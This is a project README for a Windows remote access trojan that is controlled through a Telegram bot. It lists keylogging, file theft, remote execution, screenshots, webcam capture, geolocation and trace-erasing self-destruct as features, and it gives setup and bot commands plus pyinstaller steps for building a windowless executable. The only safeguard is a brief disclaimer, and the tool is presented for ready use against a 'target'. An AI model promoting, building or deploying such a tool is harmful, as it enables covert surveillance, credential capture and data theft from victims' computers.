# RAT-via-Telegram

Windows Remote Administration Tool via Telegram

### Why another one?

The current Remote Administration Tools in the market face 2 major problems:

- Lack of encryption.
- Require port forwarding in order to control from hundreds of miles.

This RAT overcomes both these issues by using the Telegram bot API.

- Fully encrypted. The data being exchanged cannot be spied upon using MITM tools.
- Telegram messenger app provides a simple way to communicate to the target without configuring port forward before hand on the target.

## Features:

- Run keylogger on the target PC.
- Get target PC's Windows version, processor and more.
- Get target PC's IP address information and approximate location on map.
- List any directories on the target.
- Download any file locally from the target PC in the background.
- [WIP] Upload local files on to the target PC. Just send any file to the Telegram bot that you wish to upload.
- Screenshots of the target PC.
- [WIP] Take snapshots from the webcam (if attached).
- Execute any file on the target PC.
- [WIP] Self-Destruct RAT with a single command.
- More coming soon!

## Screenshots:

<img src="http://i.imgur.com/surSaEm.png" width="290"><img src="http://i.imgur.com/4pL4RJM.png" width="290"><img src="http://i.imgur.com/b77UVxL.png" width="290">

## Installation & Usage:

- Clone this repository.
- Set up a new Telegram bot talking to the `BotFather`.
- Copy the token and add it in the bottom of the script in [Line #140](RATAttack.py#L140).
- Install the dependencies: `pip install -r requirements.txt`.
- Install pyHook `64-bit` or `32-bit` depending on your system.

  For `64-bit`- `pip install pyHook-1.5.1-cp27-cp27m-win_amd64.whl`.
  
  For `32-bit`- `pip install pyHook-1.5.1-cp27-cp27m-win32.whl`.
- To run the script: `python RATAttack.py`.
- Find your bot and send some command to the bot to test it.
- To restrict the bot, so that it responds only to you, note down your chat_id from the console and replace it in [Line #133](RATAttack.py#L133) and uncomment [Line #43](RATAttack.py#L43).
<img src="http://i.imgur.com/XKARtrp.png">

### Commands:

When using the below commands; use `/` as a prefix. For example: `/pc_info`.

```
pc_info - PC information
msg_box - display message box with text
snapshot - take picture with webcam
ip_info - via ipinfo.io
download_file - download file from target
list_dir - list contents of directory
run_file - run a file on target
capture_pc - screenshot PC
keylogs - get keylogs
self_destruct - destroy all traces from target PC
```

You can copy the above to update your command list via `BotFather` so you don't have to type them manually.

## Compiling:

- Goto `C:\Python27\Scripts\` or wherever you installed python.
- Run `pyinstaller --onefile --noconsole C:\path\to\RATAttack.py`.
- Once it is compiled successfully, find the `.exe` file in `C:\Python27\Scripts\dist\`.

## Notes:

- Currently on Python2 is supported. Python3 support will be added soon!
- `/msg_box` is still in beta and may not work properly.
- Keylogger may detect some keys improperly. Like pressing `shift+/` results in recording `/` instead of `?`.

## Contributing:

- This project is still in very early stages, so you can expect some bugs. Please feel free to report them! Even better, send a pull request :)
- Any new features and ideas are most welcome!

## Disclaimer:

<b>This tool is supposed to be used only on authorized systems. Any unauthorized use of this tool without explicit permission is illegal.</b>

## License:

`The MIT License`
